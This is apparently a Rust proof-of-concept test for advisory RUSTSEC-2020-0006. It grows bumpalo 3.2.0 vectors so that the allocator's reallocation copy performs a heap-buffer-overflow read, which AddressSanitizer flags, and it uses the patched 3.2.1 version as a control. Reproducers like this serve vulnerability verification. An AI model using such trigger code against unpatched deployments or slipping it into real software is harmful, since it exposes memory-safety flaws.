//! RUSTSEC-2020-0006 / bumpalo 3.2.0.
//!
//! This standalone public-API form exercises the vulnerable reallocation copy.
//! ASan reports a heap-buffer-overflow read; the identical 3.2.1 control exits
//! cleanly.

use bumpalo::{collections::Vec, Bump};

fn main() {
    let bump = Bump::new();

    let mut first: Vec<'_, u32> = Vec::new_in(&bump);
    first.reserve(6000);
    for _ in 0..6000 {
        first.push(0);
    }

    let mut second: Vec<'_, u32> = Vec::new_in(&bump);
    second.reserve(500);
    for _ in 0..500 {
        second.push(0);
    }

    let mut third: Vec<'_, u32> = Vec::new_in(&bump);
    third.reserve(1000);
    for _ in 0..1000 {
        third.push(0);
    }

    for _ in 0..6001 {
        first.push(0);
    }

    std::hint::black_box((&first, &second, &third));
}
